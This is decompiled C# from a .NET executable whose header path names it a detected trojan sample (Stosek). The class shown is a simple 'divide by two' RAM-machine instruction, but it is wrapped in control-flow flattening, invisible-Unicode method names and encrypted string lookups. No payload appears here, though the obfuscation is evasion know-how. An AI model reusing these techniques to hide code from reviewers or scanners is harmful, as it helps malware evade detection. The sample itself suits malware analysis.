// Decompiled with JetBrains decompiler
// Type: ram_machine.Instructions.DivideByTwoInstruction
// Assembly: InternalCrossContextDelega, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D2AB7CD5-4913-4369-B066-3ED6411FFDD0
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.Stosek.gen-a7018ff4aaaaebda06615da54ab7d3dcfe06ffda501254eb9654aa27152629bb.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace ram_machine.Instructions
{
  internal class DivideByTwoInstruction : Instruction
  {
    public override int run(int[] tape)
    {
      tape[this.parameters[0]] = tape[this.parameters[0]] / 2;
      int num1 = this.line + 1;
label_1:
      int num2 = -745686130;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ -61980999)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num2 = (int) num3 * -698795626 ^ 1560464168;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return num1;
    }

    public override void setParameters(List<int> parameters)
    {
      if (parameters.Count == 1)
        goto label_4;
label_1:
      int num1 = 499612641;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 406388622)) % 5U)
        {
          case 0:
            goto label_5;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1260251263 ^ 698495892;
            continue;
          case 4:
            goto label_4;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_5:
      throw DivideByTwoInstruction.\u206C⁮⁪‌‭​‭⁬‎‭‌‮‏⁯‏‌‮⁯‬​⁯⁯⁬‬⁪‬⁮⁯⁭‍‪⁭⁫‏⁭⁪⁭​​‪‮(\u003CModule\u003E.\u206C‪⁪‭​‪‍‏⁪‭‬⁭⁭⁬‌‭⁯‪‭‪⁭‮⁮‫⁯​‌‌⁫‎‭‮⁬⁭‫⁬⁭‌⁯‮<string>(3096096943U));
label_4:
      this.parameters.Add(parameters[0]);
      num1 = 363074190;
      goto label_2;
    }

    public override string ToString()
    {
label_1:
      int num1 = -361730415;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -111451750)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -533534311 ^ 547139077;
            continue;
          case 3:
            str = DivideByTwoInstruction.\u202E​‬‮⁫⁫‫‬‌⁪⁯⁮‫​​⁬‪⁪⁪⁯‬‮‮‭‪⁫‮‬‍‮⁭‍‍‏‍‫​⁫‪‪‮(new string[6]
            {
              this.line.ToString(),
              \u003CModule\u003E.\u206F‮‏⁫‏‌‏⁫‭⁯⁪‏⁯‌‬‬‌⁮‏‌⁯‪‭‭‬⁫⁭‪‍⁫‏‍‏‬⁬⁬‫‬‪‫‮<string>(636178787U),
              this.parameters[0].ToString(),
              \u003CModule\u003E.\u206F‮‏⁫‏‌‏⁫‭⁯⁪‏⁯‌‬‬‌⁮‏‌⁯‪‭‭‬⁫⁭‪‍⁫‏‍‏‬⁬⁬‫‬‪‫‮<string>(1521295645U),
              this.parameters[0].ToString(),
              \u003CModule\u003E.\u206C‪⁪‭​‪‍‏⁪‭‬⁭⁭⁬‌‭⁯‪‭‪⁭‮⁮‫⁯​‌‌⁫‎‭‮⁬⁭‫⁬⁭‌⁯‮<string>(3775659199U)
            });
            num1 = (int) num2 * 1609522758 ^ -1496450543;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static ArgumentException \u206C⁮⁪‌‭​‭⁬‎‭‌‮‏⁯‏‌‮⁯‬​⁯⁯⁬‬⁪‬⁮⁯⁭‍‪⁭⁫‏⁭⁪⁭​​‪‮(
      [In] string obj0)
    {
      return new ArgumentException(obj0);
    }

    static string \u202E​‬‮⁫⁫‫‬‌⁪⁯⁮‫​​⁬‪⁪⁪⁯‬‮‮‭‪⁫‮‬‍‮⁭‍‍‏‍‫​⁫‪‪‮([In] string[] obj0) => string.Concat(obj0);
  }
}
